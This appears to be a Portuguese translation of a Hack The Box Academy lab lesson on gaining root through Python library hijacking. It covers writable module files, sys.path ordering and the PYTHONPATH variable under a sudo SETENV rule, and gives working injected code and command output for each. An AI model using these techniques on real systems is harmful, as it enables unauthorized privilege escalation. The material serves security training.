Python é uma das linguagens de programação mais populares devido à sua vasta coleção de bibliotecas. Entre elas, a **NumPy** é uma extensão de código aberto que facilita o manuseio de listas e matrizes extensas e oferece funções matemáticas essenciais.

A **Pandas** é outra biblioteca importante para o processamento e análise de dados, com um foco especial em séries temporais. Além disso, a biblioteca padrão do Python inclui módulos que economizam tempo ao fornecer soluções prontas para várias tarefas, melhorando o desempenho dos programas ao evitar a importação automática de todos os módulos na instalação básica.

### Importando módulos
```python
#!/usr/bin/env python3

# Method 1
import pandas

# Method 2
from pandas import *

# Method 3
from pandas import Series
```

Há muitas maneiras pelas quais podemos sequestrar uma biblioteca Python. Muito depende do script e do seu conteúdo em si. No entanto, há três vulnerabilidades básicas onde o sequestro pode ser usado:

1. Permissões de gravação erradas
2. Caminho da Biblioteca
3. Variável de ambiente PYTHONPATH

## Permissões de gravação erradas

Por exemplo, podemos imaginar que estamos no host de um desenvolvedor na intranet da empresa e que o desenvolvedor está trabalhando com python. Então temos um total de três componentes que estão conectados. Este é o script python real que importa um módulo python e os privilégios do script, bem como as permissões do módulo.

Se um módulo Python tiver permissões de gravação definidas para todos os usuários, ele pode ser editado e manipulado para inserir comandos ou funções desejadas. Se o script Python que importa esse módulo tiver permissões SUID/SGID, o código inserido será executado automaticamente com essas permissões elevadas.

Se observarmos as permissões definidas no script `mem_status.py`, podemos ver que ele tem um conjunto `SUID`.

#### Script Python
```shell-session
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

Então podemos executar esse script com os privilégios de outro usuário, no nosso caso, como `root`. Também temos permissão para visualizar o script e ler seu conteúdo.

#### Script Python - Conteúdo
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

Então esse script é bem simples e só mostra a memória virtual disponível em porcentagem. Também podemos ver na segunda linha que esse script importa o módulo `psutil` e usa a função `virtual_memory()`.

Então podemos procurar por essa função na pasta `psutil` e verificar se esse módulo tem permissões de gravação para nós.

#### Permissões do módulo
```shell-session
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Essas permissões são mais comuns em ambientes de desenvolvedores onde muitos trabalham em scripts diferentes e podem exigir privilégios mais altos.

#### Conteúdo do módulo
```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Esta é a parte da biblioteca onde podemos inserir nosso código. É recomendado colocá-lo logo no início da função. Lá podemos inserir tudo o que consideramos correto e eficaz.

Podemos importar o módulo `os` para fins de teste, o que nos permite executar comandos do sistema. Com isso, podemos inserir o comando `id` e verificar durante a execução do script se o código inserido é executado.

#### Conteúdo do módulo - Sequestro
```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Agora podemos executar o script `sudo` e verificar se obtemos o resultado desejado.

#### Escalação de privilégios
```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

Sucesso. Como podemos ver no resultado acima, conseguimos sequestrar a biblioteca com sucesso e ter nosso código dentro da função `virtual_memory()` executado como `root`. Agora que temos o resultado desejado, podemos editar a biblioteca novamente, mas, dessa vez, inserir um shell reverso que se conecta ao nosso host como `root`.

## Caminho da Biblioteca

Em Python, cada versão tem uma ordem especificada na qual as bibliotecas ( `modules`) são pesquisadas e importadas. A ordem na qual o Python importa `modules`é baseada em um sistema de prioridade, o que significa que os caminhos mais altos na lista têm prioridade sobre os mais baixos na lista. Podemos ver isso emitindo o seguinte comando:

#### Listagem PYTHONPATH
```shell-session
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

Para poder usar esta variante, são necessários dois pré-requisitos.

1. O módulo importado pelo script está localizado em um dos caminhos de menor prioridade listados pela variável `PYTHONPATH`.
2. Precisamos ter permissões de gravação em um dos caminhos com maior prioridade na lista.

Se o módulo importado estiver em um caminho inferior na lista de prioridades e um caminho superior for editável, podemos criar um módulo com o mesmo nome e incluir nossas próprias funções. Python irá importar o módulo do caminho de maior prioridade primeiro, executando nosso código antes de chegar ao módulo original.

Para que isso faça um pouco mais de sentido, vamos continuar com o exemplo anterior e mostrar como isso pode ser explorado. Anteriormente, o módulo `psutil` era importado para o script `mem_status.py`. Podemos ver o local de instalação padrão do `psutil` emitindo o seguinte comando:

#### Local de instalação padrão do Psutil
```shell-session
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

A partir deste exemplo, podemos ver que `psutil` está instalado no seguinte caminho: `/usr/local/lib/python3.8/dist-packages`. Da nossa listagem anterior da variável `PYTHONPATH`, temos uma quantidade razoável de diretórios para escolher para ver se pode haver alguma configuração incorreta no ambiente para nos permitir acesso `write` a qualquer um deles. Vamos verificar.

#### Permissões de diretório mal configuradas
```shell-session
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

Após verificar todos os diretórios listados, parece que o caminho `/usr/lib/python3.8` está mal configurado de forma a permitir que qualquer usuário escreva nele.

Cruzando os valores da variável `PYTHONPATH`, podemos ver que esse caminho está mais alto na lista do que o caminho em que `psutil` está instalado.

Vamos tentar abusar dessa configuração incorreta para criar nosso próprio módulo `psutil` contendo nossa própria função `virtual_memory()` maliciosa dentro do diretório `/usr/lib/python3.8`.

#### Conteúdo do módulo sequestrado - psutil.py
```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

Para realizar o ataque, devemos criar um arquivo chamado `psutil.py` no diretório especificado. É crucial que o módulo tenha o mesmo nome e a mesma função, com o número correto de argumentos, como a função que queremos sequestrar. Sem essas condições, o ataque não funcionará. Após criar o arquivo com o script de sequestro, o sistema estará preparado para a exploração.

Vamos executar o script `mem_status.py` novamente como `sudo`, como no exemplo anterior.

#### Escalonamento de privilégios por meio do sequestro do caminho da biblioteca Python
```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

Como podemos ver na saída, obtivemos execução `root` com sucesso, sequestrando o caminho do módulo por meio de uma configuração incorreta nas permissões do diretório `/usr/lib/python3.8`.

## Variável de ambiente PYTHONPATH

Na seção anterior, discutimos o termo **PYTHONPATH**, mas não detalhamos seu uso e importância. **PYTHONPATH** é uma variável de ambiente que especifica os diretórios onde o Python procura módulos para importar.

Manipular essa variável permite redirecionar a pesquisa de módulos para locais definidos pelo usuário. É crucial verificar se temos permissões para definir variáveis de ambiente para o binário Python, o que pode ser feito checando nossas permissões `sudo`.

#### Verificando permissões sudo
```shell-session
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

Como mostrado no exemplo, temos permissão para executar `/usr/bin/python3` com privilégios de `sudo`, permitindo-nos definir variáveis de ambiente para este binário. Com o `SETENV` habilitado, não há restrições na definição de variáveis de ambiente antes de chamar o binário. Isso nos permite definir variáveis de ambiente no contexto do programa em execução. Vamos aplicar isso usando o script `psutil.py` da seção anterior.

#### Escalonamento de privilégios usando a variável de ambiente PYTHONPATH

```shell-session
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

Neste exemplo, movemos o script python anterior do diretório `/usr/lib/python3.8` para `/tmp`. A partir daqui, chamamos novamente `/usr/bin/python3` para executar `mem_stats.py`, no entanto, especificamos que a variável `PYTHONPATH` contém o diretório `/tmp` para que ele force o Python a pesquisar naquele diretório procurando pelo módulo `psutil` a ser importado. Como podemos ver, mais uma vez executamos com sucesso nosso script sob o contexto de root.





















































































































